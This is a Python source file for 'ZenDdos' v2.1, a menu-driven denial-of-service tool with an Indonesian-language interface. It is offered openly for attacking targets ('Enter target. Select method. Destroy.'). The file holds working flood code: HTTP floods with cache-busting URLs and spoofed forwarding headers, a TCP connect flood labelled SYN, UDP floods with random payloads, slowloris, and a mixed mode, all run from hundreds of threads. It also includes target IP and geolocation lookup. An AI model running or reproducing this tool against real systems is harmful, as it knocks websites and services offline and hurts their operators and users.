#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import random
import socket
import threading
import requests
import urllib.parse
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

VERSION = "2.1"
DEVELOPER = "zaax"
TOOL_NAME = "ZenDdos"

BANNER = f"""
{Fore.RED}╔══════════════════════════════════════════════════════════════════╗
{Fore.RED}║                                                                  ║
{Fore.RED}║   {Fore.YELLOW}███████╗███████╗███╗   ██╗██████╗ ██████╗  ██████╗ ███████╗{Fore.RED}║
{Fore.RED}║   {Fore.YELLOW}╚══███╔╝██╔════╝████╗  ██║██╔══██╗██╔══██╗██╔═══██╗██╔════╝{Fore.RED}║
{Fore.RED}║   {Fore.YELLOW}  ███╔╝ █████╗  ██╔██╗ ██║██║  ██║██████╔╝██║   ██║███████╗{Fore.RED}║
{Fore.RED}║   {Fore.YELLOW} ███╔╝  ██╔══╝  ██║╚██╗██║██║  ██║██╔══██╗██║   ██║╚════██║{Fore.RED}║
{Fore.RED}║   {Fore.YELLOW}███████╗███████╗██║ ╚████║██████╔╝██║  ██║╚██████╔╝███████║{Fore.RED}║
{Fore.RED}║   {Fore.YELLOW}╚══════╝╚══════╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝{Fore.RED}║
{Fore.RED}║                                                                  ║
{Fore.RED}║   {Fore.GREEN}┌─────────────────────────────────────────────────────┐{Fore.RED}          ║
{Fore.RED}║   {Fore.GREEN}│  {Fore.WHITE}{TOOL_NAME} v{VERSION}{Fore.GREEN}                                 │{Fore.RED}          ║
{Fore.RED}║   {Fore.GREEN}│  {Fore.WHITE}Developer: {Fore.CYAN}{DEVELOPER}{Fore.GREEN}                         │{Fore.RED}          ║
{Fore.RED}║   {Fore.GREEN}│  {Fore.WHITE}Status: {Fore.GREEN}READY{Fore.GREEN}                              │{Fore.RED}          ║
{Fore.RED}║   {Fore.GREEN}└─────────────────────────────────────────────────────┘{Fore.RED}          ║
{Fore.RED}║                                                                  ║
{Fore.RED}║   {Fore.YELLOW}"Enter target. Select method. Destroy."{Fore.RED}                      ║
{Fore.RED}║                                                                  ║
{Fore.RED}╚══════════════════════════════════════════════════════════════════╝
{Fore.RESET}
"""

class IPChecker:
    """Fitur Cek IP dari link/domain"""
    
    @staticmethod
    def get_ip_from_url(url):
        try:
            # Bersihkan URL
            if not url.startswith('http'):
                url = 'http://' + url
            
            parsed = urllib.parse.urlparse(url)
            domain = parsed.netloc or parsed.path
            
            # Hapus port jika ada
            if ':' in domain:
                domain = domain.split(':')[0]
            
            # Resolve DNS
            ip = socket.gethostbyname(domain)
            
            # Dapatkan info tambahan
            info = {
                'domain': domain,
                'ip': ip,
                'port': parsed.port or 80,
                'protocol': parsed.scheme or 'http'
            }
            
            # Coba dapatkan info WHOIS sederhana
            try:
                import subprocess
                whois = subprocess.check_output(['whois', domain], text=True, timeout=3)
                lines = whois.split('\n')
                for line in lines[:20]:
                    if 'Country' in line or 'OrgName' in line or 'Registrant' in line:
                        info['whois'] = info.get('whois', '') + line + '\n'
            except:
                pass
            
            return info
            
        except socket.gaierror:
            return {'error': 'Domain tidak ditemukan'}
        except Exception as e:
            return {'error': str(e)}
    
    @staticmethod
    def check_ip(ip):
        try:
            # Cek IP dengan ip-api.com
            response = requests.get(f'http://ip-api.com/json/{ip}', timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'ip': ip,
                        'country': data.get('country', 'Unknown'),
                        'city': data.get('city', 'Unknown'),
                        'region': data.get('regionName', 'Unknown'),
                        'isp': data.get('isp', 'Unknown'),
                        'org': data.get('org', 'Unknown'),
                        'timezone': data.get('timezone', 'Unknown'),
                        'lat': data.get('lat', 0),
                        'lon': data.get('lon', 0)
                    }
            return {'error': 'Gagal mendapatkan info IP'}
        except:
            return {'error': 'Gagal koneksi ke API'}

class AttackEngine:
    def __init__(self, config):
        self.config = config
        self.running = False
        self.total_requests = 0
        self.success = 0
        self.failed = 0
        self.threads = []
        self.user_agents = config.get('user_agents', [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            "Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0"
        ])
        self.timeout = config.get('timeout', 5)
    
    def http_flood(self, target, port):
        try:
            if not target.startswith('http'):
                target = 'http://' + target
            
            # Multiple endpoint untuk by pass cache
            endpoints = ['/', '/api', '/v1', '/test', '/ping', '/status']
            endpoint = random.choice(endpoints)
            
            url = f"{target}{endpoint}?rand={random.randint(1,999999)}&t={int(time.time())}&r={random.random()}"
            
            headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache, no-store, must-revalidate',
                'Pragma': 'no-cache',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Request-ID': str(random.randint(100000, 999999))
            }
            
            response = requests.get(url, headers=headers, timeout=self.timeout, verify=False)
            return response.status_code in [200, 201, 202, 204, 301, 302, 307, 308, 400, 401, 403, 404, 405, 408, 429, 500, 502, 503, 504]
            
        except requests.exceptions.Timeout:
            return True  # Timeout dianggap sukses (server sibuk)
        except requests.exceptions.ConnectionError:
            return True  # Connection error = server down
        except:
            return False
    
    def syn_flood(self, target, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            sock.send(b"GET / HTTP/1.1\r\n\r\n")
            sock.close()
            return True
        except:
            return False
    
    def udp_flood(self, target, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Variasi payload
            payloads = [
                random._urandom(1024),
                random._urandom(2048),
                random._urandom(512),
                b"GET / HTTP/1.1\r\n\r\n" * 10
            ]
            payload = random.choice(payloads)
            for _ in range(3):
                sock.sendto(payload, (target, port))
            sock.close()
            return True
        except:
            return False
    
    def slowloris(self, target, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            
            headers = [
                f"GET /?{random.randint(1,999999)} HTTP/1.1\r\n",
                f"Host: {target}\r\n",
                f"User-Agent: {random.choice(self.user_agents)}\r\n",
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                f"Accept-Language: en-US,en;q=0.5\r\n",
                f"Accept-Encoding: gzip, deflate\r\n",
                f"Connection: keep-alive\r\n",
                f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
            ]
            
            for h in headers:
                sock.send(h.encode())
                time.sleep(0.1)
            
            # Keep alive dengan header random
            for _ in range(20):
                sock.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                time.sleep(0.5)
            
            sock.close()
            return True
        except:
            return False
    
    def mixed_attack(self, target, port):
        methods = ['http', 'syn', 'udp', 'slowloris']
        method = random.choice(methods)
        
        if method == 'http':
            return self.http_flood(target, port)
        elif method == 'syn':
            return self.syn_flood(target, port)
        elif method == 'udp':
            return self.udp_flood(target, port)
        else:
            return self.slowloris(target, port)
    
    def start_attack(self, method, target, port, duration):
        self.running = True
        self.total_requests = 0
        self.success = 0
        self.failed = 0
        self.threads = []
        
        thread_count = self.config.get('threads', 500)
        max_requests = self.config.get('max_requests', 100000)
        
        print(f"{Fore.CYAN}[*] Starting {thread_count} threads...")
        
        def worker():
            while self.running and self.total_requests < max_requests:
                try:
                    if method == 'http':
                        success = self.http_flood(target, port)
                    elif method == 'syn':
                        success = self.syn_flood(target, port)
                    elif method == 'udp':
                        success = self.udp_flood(target, port)
                    elif method == 'slowloris':
                        success = self.slowloris(target, port)
                    elif method == 'mixed':
                        success = self.mixed_attack(target, port)
                    else:
                        success = False
                    
                    self.total_requests += 1
                    if success:
                        self.success += 1
                    else:
                        self.failed += 1
                    
                    time.sleep(self.config.get('delay', 0.001))
                except:
                    self.failed += 1
                    continue
        
        # Start threads
        for i in range(thread_count):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.threads.append(t)
            if i % 50 == 0:
                print(f"{Fore.CYAN}[*] Started {i+1}/{thread_count} threads")
        
        print(f"{Fore.GREEN}[✓] All threads started!")
        
        # Monitor
        start_time = time.time()
        last_print = 0
        while self.running:
            elapsed = time.time() - start_time
            if elapsed >= duration:
                self.running = False
                break
            
            if int(elapsed) > last_print and int(elapsed) % 3 == 0:
                last_print = int(elapsed)
                rate = self.total_requests / max(1, elapsed)
                print(f"{Fore.CYAN}[*] {int(elapsed)}s/{duration}s | Req: {self.total_requests} | Rate: {rate:.0f}/s | Success: {self.success}")
            
            time.sleep(0.5)
        
        self.running = False
        
        # Join threads
        for t in self.threads:
            try:
                t.join(timeout=0.5)
            except:
                pass
        
        print(f"\n{Fore.GREEN}╔═══════════════════════════════════════════════╗")
        print(f"{Fore.GREEN}║  {Fore.WHITE}SERANGAN SELESAI{Fore.GREEN}                              ║")
        print(f"{Fore.GREEN}╠═══════════════════════════════════════════════╣")
        print(f"{Fore.GREEN}║  {Fore.WHITE}Total Request : {Fore.YELLOW}{self.total_requests}")
        print(f"{Fore.GREEN}║  {Fore.WHITE}Success       : {Fore.GREEN}{self.success}")
        print(f"{Fore.GREEN}║  {Fore.WHITE}Failed        : {Fore.RED}{self.failed}")
        print(f"{Fore.GREEN}║  {Fore.WHITE}Success Rate  : {Fore.CYAN}{self.success / max(1, self.total_requests) * 100:.1f}%")
        print(f"{Fore.GREEN}╚═══════════════════════════════════════════════╝{Fore.RESET}")

class ZenDdos:
    def __init__(self):
        self.config = self.load_config()
        self.attack = AttackEngine(self.config)
        self.running = True
        self.ip_checker = IPChecker()
    
    def load_config(self):
        try:
            with open('config.json', 'r') as f:
                return json.load(f)
        except:
            default = {
                "threads": 300,
                "timeout": 5,
                "max_requests": 100000,
                "delay": 0.001,
                "user_agents": [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
                    "Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0"
                ]
            }
            with open('config.json', 'w') as f:
                json.dump(default, f, indent=4)
            return default
    
    def clear_screen(self):
        os.system('clear' if os.name == 'posix' else 'cls')
    
    def show_banner(self):
        self.clear_screen()
        print(BANNER)
    
    def show_menu(self):
        self.show_banner()
        
        print(f"""
{Fore.CYAN}┌─────────────────────────────────────────────────────┐
{Fore.CYAN}│  {Fore.GREEN}ZENDDOS — MAIN MENU{Fore.CYAN}                          │
{Fore.CYAN}├─────────────────────────────────────────────────────┤
{Fore.GREEN}│  {Fore.WHITE}[1] {Fore.YELLOW}HTTP FLOOD{Fore.CYAN}                             │
{Fore.GREEN}│  {Fore.WHITE}[2] {Fore.YELLOW}SYN FLOOD{Fore.CYAN}                              │
{Fore.GREEN}│  {Fore.WHITE}[3] {Fore.YELLOW}UDP FLOOD{Fore.CYAN}                              │
{Fore.GREEN}│  {Fore.WHITE}[4] {Fore.YELLOW}SLOWLORIS{Fore.CYAN}                             │
{Fore.GREEN}│  {Fore.WHITE}[5] {Fore.YELLOW}MIXED ATTACK{Fore.CYAN}                          │
{Fore.CYAN}├─────────────────────────────────────────────────────┤
{Fore.GREEN}│  {Fore.WHITE}[6] {Fore.YELLOW}CEK IP WEB{Fore.CYAN}                             │
{Fore.GREEN}│  {Fore.WHITE}[7] {Fore.YELLOW}KONFIGURASI{Fore.CYAN}                           │
{Fore.GREEN}│  {Fore.WHITE}[8] {Fore.YELLOW}STATISTIK{Fore.CYAN}                              │
{Fore.GREEN}│  {Fore.WHITE}[9] {Fore.YELLOW}TENTANG{Fore.CYAN}                                │
{Fore.GREEN}│  {Fore.WHITE}[0] {Fore.RED}EXIT{Fore.CYAN}                                      │
{Fore.CYAN}└─────────────────────────────────────────────────────┘
        """)
        
        choice = input(f"{Fore.YELLOW}[>] Pilih angka: {Fore.WHITE}")
        return choice.strip()
    
    def get_target(self):
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│  {Fore.YELLOW}TARGET SETUP{Fore.CYAN}                                 │")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘\n")
        
        target = input(f"{Fore.WHITE}[>] Target URL/IP: {Fore.YELLOW}").strip()
        port = input(f"{Fore.WHITE}[>] Port (default 80): {Fore.YELLOW}").strip() or "80"
        duration = input(f"{Fore.WHITE}[>] Duration (detik): {Fore.YELLOW}").strip() or "60"
        
        return {
            'target': target,
            'port': int(port),
            'duration': int(duration)
        }
    
    def check_ip_menu(self):
        self.show_banner()
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│  {Fore.YELLOW}CEK IP WEB{Fore.CYAN}                                    │")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘\n")
        
        url = input(f"{Fore.WHITE}[>] Masukkan URL/Domain: {Fore.YELLOW}").strip()
        
        if not url:
            print(f"{Fore.RED}[!] URL kosong!")
            time.sleep(1)
            return
        
        print(f"\n{Fore.CYAN}[*] Mencari informasi IP untuk: {url}")
        
        info = self.ip_checker.get_ip_from_url(url)
        
        if 'error' in info:
            print(f"{Fore.RED}[!] Error: {info['error']}")
        else:
            print(f"\n{Fore.GREEN}╔═══════════════════════════════════════════════╗")
            print(f"{Fore.GREEN}║  {Fore.WHITE}HASIL CEK IP{Fore.GREEN}                              ║")
            print(f"{Fore.GREEN}╠═══════════════════════════════════════════════╣")
            print(f"{Fore.GREEN}║  {Fore.WHITE}Domain  : {Fore.CYAN}{info.get('domain', '-')}")
            print(f"{Fore.GREEN}║  {Fore.WHITE}IP      : {Fore.YELLOW}{info.get('ip', '-')}")
            print(f"{Fore.GREEN}║  {Fore.WHITE}Port    : {Fore.CYAN}{info.get('port', '-')}")
            print(f"{Fore.GREEN}║  {Fore.WHITE}Protocol: {Fore.CYAN}{info.get('protocol', '-')}")
            
            # Cek lokasi IP
            if info.get('ip'):
                ip_info = self.ip_checker.check_ip(info['ip'])
                if 'error' not in ip_info:
                    print(f"{Fore.GREEN}╠═══════════════════════════════════════════════╣")
                    print(f"{Fore.GREEN}║  {Fore.WHITE}LOKASI IP{Fore.GREEN}                                ║")
                    print(f"{Fore.GREEN}║  {Fore.WHITE}Country : {Fore.CYAN}{ip_info.get('country', '-')}")
                    print(f"{Fore.GREEN}║  {Fore.WHITE}City    : {Fore.CYAN}{ip_info.get('city', '-')}")
                    print(f"{Fore.GREEN}║  {Fore.WHITE}Region  : {Fore.CYAN}{ip_info.get('region', '-')}")
                    print(f"{Fore.GREEN}║  {Fore.WHITE}ISP     : {Fore.CYAN}{ip_info.get('isp', '-')}")
                    print(f"{Fore.GREEN}║  {Fore.WHITE}Org     : {Fore.CYAN}{ip_info.get('org', '-')}")
                    print(f"{Fore.GREEN}║  {Fore.WHITE}Timezone: {Fore.CYAN}{ip_info.get('timezone', '-')}")
                    print(f"{Fore.GREEN}║  {Fore.WHITE}Lat/Lon : {Fore.CYAN}{ip_info.get('lat', 0)}, {ip_info.get('lon', 0)}")
            
            if info.get('whois'):
                print(f"{Fore.GREEN}╠═══════════════════════════════════════════════╣")
                print(f"{Fore.GREEN}║  {Fore.WHITE}WHOIS{Fore.GREEN}                                     ║")
                for line in info['whois'].split('\n')[:5]:
                    if line.strip():
                        print(f"{Fore.GREEN}║  {Fore.WHITE}{line[:50]}")
            
            print(f"{Fore.GREEN}╚═══════════════════════════════════════════════╝{Fore.RESET}")
        
        input(f"\n{Fore.YELLOW}[>] Enter untuk kembali...")
    
    def run_attack(self, method):
        target_data = self.get_target()
        if not target_data['target']:
            print(f"{Fore.RED}[!] Target kosong!")
            time.sleep(1)
            return
        
        # Cek IP target
        print(f"\n{Fore.CYAN}[*] Resolving target IP...")
        try:
            target_ip = socket.gethostbyname(target_data['target'])
            print(f"{Fore.GREEN}[✓] IP: {target_ip}")
        except:
            print(f"{Fore.YELLOW}[!] Gagal resolve IP, lanjutkan...")
        
        print(f"\n{Fore.CYAN}[*] Memulai serangan...")
        print(f"{Fore.WHITE}Target   : {Fore.YELLOW}{target_data['target']}")
        print(f"{Fore.WHITE}Port     : {Fore.YELLOW}{target_data['port']}")
        print(f"{Fore.WHITE}Duration : {Fore.YELLOW}{target_data['duration']}s")
        print(f"{Fore.WHITE}Method   : {Fore.YELLOW}{method.upper()}")
        print(f"{Fore.RED}[!] Tekan CTRL+C untuk berhenti\n")
        
        try:
            self.attack.start_attack(
                method=method,
                target=target_data['target'],
                port=target_data['port'],
                duration=target_data['duration']
            )
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Serangan dihentikan!")
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}")
        
        input(f"\n{Fore.YELLOW}[>] Enter untuk kembali...")
    
    def show_config(self):
        self.show_banner()
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│  {Fore.YELLOW}KONFIGURASI{Fore.CYAN}                                   │")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘\n")
        
        print(f"{Fore.WHITE}Threads     : {Fore.GREEN}{self.config.get('threads', 500)}")
        print(f"{Fore.WHITE}Timeout     : {Fore.GREEN}{self.config.get('timeout', 5)}s")
        print(f"{Fore.WHITE}Max Request : {Fore.GREEN}{self.config.get('max_requests', 100000)}")
        print(f"{Fore.WHITE}Delay       : {Fore.GREEN}{self.config.get('delay', 0.001)}s")
        
        print(f"\n{Fore.YELLOW}[1] Ubah Threads")
        print(f"{Fore.YELLOW}[2] Ubah Timeout")
        print(f"{Fore.YELLOW}[3] Ubah Max Request")
        print(f"{Fore.YELLOW}[4] Ubah Delay")
        print(f"{Fore.YELLOW}[0] Kembali")
        
        choice = input(f"\n{Fore.YELLOW}[>] Pilih: {Fore.WHITE}")
        
        if choice == '1':
            val = int(input(f"{Fore.WHITE}Threads: {Fore.YELLOW}") or "300")
            self.config['threads'] = val
            self.save_config()
        elif choice == '2':
            val = int(input(f"{Fore.WHITE}Timeout (detik): {Fore.YELLOW}") or "5")
            self.config['timeout'] = val
            self.save_config()
        elif choice == '3':
            val = int(input(f"{Fore.WHITE}Max Request: {Fore.YELLOW}") or "100000")
            self.config['max_requests'] = val
            self.save_config()
        elif choice == '4':
            val = float(input(f"{Fore.WHITE}Delay (detik): {Fore.YELLOW}") or "0.001")
            self.config['delay'] = val
            self.save_config()
    
    def save_config(self):
        with open('config.json', 'w') as f:
            json.dump(self.config, f, indent=4)
        print(f"{Fore.GREEN}[✓] Config tersimpan!")
        time.sleep(1)
    
    def show_stats(self):
        self.show_banner()
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│  {Fore.YELLOW}STATISTIK{Fore.CYAN}                                    │")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘\n")
        
        print(f"{Fore.WHITE}Total Request : {Fore.GREEN}{self.attack.total_requests}")
        print(f"{Fore.WHITE}Success       : {Fore.GREEN}{self.attack.success}")
        print(f"{Fore.WHITE}Failed        : {Fore.RED}{self.attack.failed}")
        print(f"{Fore.WHITE}Success Rate  : {Fore.CYAN}{self.attack.success / max(1, self.attack.total_requests) * 100:.1f}%")
        
        input(f"\n{Fore.YELLOW}[>] Enter untuk kembali...")
    
    def about(self):
        self.show_banner()
        print(f"\n{Fore.CYAN}┌─────────────────────────────────────────────────────┐")
        print(f"{Fore.CYAN}│  {Fore.YELLOW}TENTANG ZENDDOS{Fore.CYAN}                              │")
        print(f"{Fore.CYAN}└─────────────────────────────────────────────────────┘\n")
        
        print(f"{Fore.WHITE}Nama    : {Fore.CYAN}{TOOL_NAME}")
        print(f"{Fore.WHITE}Versi   : {Fore.CYAN}{VERSION}")
        print(f"{Fore.WHITE}Dev     : {Fore.CYAN}{DEVELOPER}")
        print(f"{Fore.WHITE}Metode  : {Fore.CYAN}HTTP, SYN, UDP, Slowloris, Mixed")
        print(f"{Fore.WHITE}Fitur   : {Fore.CYAN}IP Check, Konfigurasi, Statistik")
        print(f"{Fore.WHITE}Status  : {Fore.GREEN}WORK")
        
        input(f"\n{Fore.YELLOW}[>] Enter untuk kembali...")
    
    def run(self):
        while self.running:
            choice = self.show_menu()
            
            if choice == '1':
                self.run_attack('http')
            elif choice == '2':
                self.run_attack('syn')
            elif choice == '3':
                self.run_attack('udp')
            elif choice == '4':
                self.run_attack('slowloris')
            elif choice == '5':
                self.run_attack('mixed')
            elif choice == '6':
                self.check_ip_menu()
            elif choice == '7':
                self.show_config()
            elif choice == '8':
                self.show_stats()
            elif choice == '9':
                self.about()
            elif choice == '0':
                print(f"\n{Fore.GREEN}[*] Thanks for using {TOOL_NAME}!")
                print(f"{Fore.CYAN}[*] Developer: {DEVELOPER}")
                self.running = False
                sys.exit()
            else:
                print(f"{Fore.RED}[!] Pilihan salah!")
                time.sleep(1)

if __name__ == '__main__':
    try:
        bot = ZenDdos()
        bot.run()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Interrupted")
        print(f"{Fore.CYAN}[*] Thanks for using ZenDdos!")
        print(f"{Fore.CYAN}[*] Developer: {DEVELOPER}")
        sys.exit()
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}")
        sys.exit()
